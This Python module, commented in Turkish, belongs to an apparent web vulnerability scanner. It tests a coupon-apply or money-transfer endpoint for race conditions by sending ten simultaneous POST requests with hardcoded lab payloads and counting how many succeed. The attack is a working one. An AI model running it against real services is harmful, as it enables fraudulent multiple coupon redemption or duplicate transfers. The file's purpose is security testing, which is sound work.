import asyncio
import aiohttp
import time
import statistics
from urllib.parse import urlparse

class RaceConditionHunter:
    """
    Race Condition (Zamanlama Hatası) Zafiyet Tarayıcısı.
    Yüksek eşzamanlılık (concurrency) ile aynı kaynağa erişmeye çalışır.
    """
    def __init__(self, log, add_result=None, request_cb=None):
        self.log = log
        self.add_result = add_result
        self.request_cb = request_cb
        self.category = 'RACE_CONDITION'
        self.name = 'Race Condition Hunter'
        # Threading/Async ayarları engine tarafından enjekte edilir
        self.module_semaphore = None 
        self.engine_instance = None

    async def scan(self, url, session, callback):
        """
        Ana tarama fonksiyonu.
        """
        self.log(f"[{self.category}] Analiz Başlatılıyor...", "INFO")
        
        target_endpoint = url
        # Eğer ana domain verildiyse (örn: http://127.0.0.1:5000), POC endpoint'ini tahmin etmeye çalış
        # Gerçek hayatta burası crawling verileriyle beslenir.
        if "coupon/apply" not in url and "transfer" not in url:
             # POC için varsayılan endpoint'i ekle
             if url.endswith('/'):
                 target_endpoint = url + "api/v1/coupon/apply"
             else:
                 target_endpoint = url + "/api/v1/coupon/apply"
        
        self.log(f"[{self.category}] Hedef endpoint tespit edildi: {urlparse(target_endpoint).path}", "INFO")

        # --- POC PAYLOAD HAZIRLIĞI (LAB MODE) ---
        # Bu kısım, POC sunucusuyla konuşabilmek için özel olarak eklendi.
        # Normalde bu veriler Crawling/Pre-Scan aşamasında toplanır.
        payload = {}
        headers = {}
        
        if "coupon/apply" in target_endpoint:
            payload = {"code": "RACE2025", "user_id": 102}
            headers = {"Content-Type": "application/json"}
            self.log(f"[{self.category}] POC Modu Aktif: Kupon payload'u yüklendi.", "INFO")
        elif "transfer" in target_endpoint:
            payload = {"amount": 10}
            headers = {"Content-Type": "application/json"}
            self.log(f"[{self.category}] POC Modu Aktif: Transfer payload'u yüklendi.", "INFO")

        # --- SALDIRI BAŞLATILIYOR ---
        THREAD_COUNT = 10
        self.log(f"[{self.category}] Eşzamanlı istekler gönderiliyor (Threads: {THREAD_COUNT})...", "INFO")

        results = []
        
        async def attack_request():
            try:
                if self.request_cb: self.request_cb()
                
                # Jitter olmadan, aynı anda vurmak için sleep yok!
                async with session.post(target_endpoint, json=payload, headers=headers) as resp:
                    status = resp.status
                    text = await resp.text()
                    return status, text
            except Exception as e:
                return "ERROR", str(e)

        # Tüm istekleri aynı anda başlat (Gather)
        tasks = [attack_request() for _ in range(THREAD_COUNT)]
        responses = await asyncio.gather(*tasks)

        # --- ANALİZ ---
        success_count = 0
        status_codes = []
        
        for status, text in responses:
            status_codes.append(status)
            # POC sunucusu başarılı işlemde 200 döner
            if status == 200 and "success" in text.lower():
                success_count += 1
        
        # Sonuçları Logla
        status_dist = {s: status_codes.count(s) for s in set(status_codes)}
        self.log(f"[{self.category}] Yanıt Dağılımı: {status_dist}", "INFO")

        if success_count > 1:
            msg = f"KRİTİK: Race Condition Başarılı! {success_count} adet istek aynı anda 'success' yanıtı aldı (Normalde 1 olmalıydı)."
            self.log(f"[{self.category}] {msg}", "CRITICAL")
            
            if self.add_result:
                self.add_result(
                    self.category, 
                    "CRITICAL", 
                    msg, 
                    15.0, # SRP Puanı
                    poc_data={"url": target_endpoint, "method": "POST", "payload": payload, "concurrent_requests": THREAD_COUNT}
                )
        elif success_count == 1:
            self.log(f"[{self.category}] Güvenli: Sadece 1 istek başarılı oldu. Race condition oluşmadı.", "SUCCESS")
        else:
            self.log(f"[{self.category}] Bilgi: Hiçbir işlem başarılı olmadı (Auth veya Parametre hatası olabilir).", "WARNING")

        if callback:
            callback()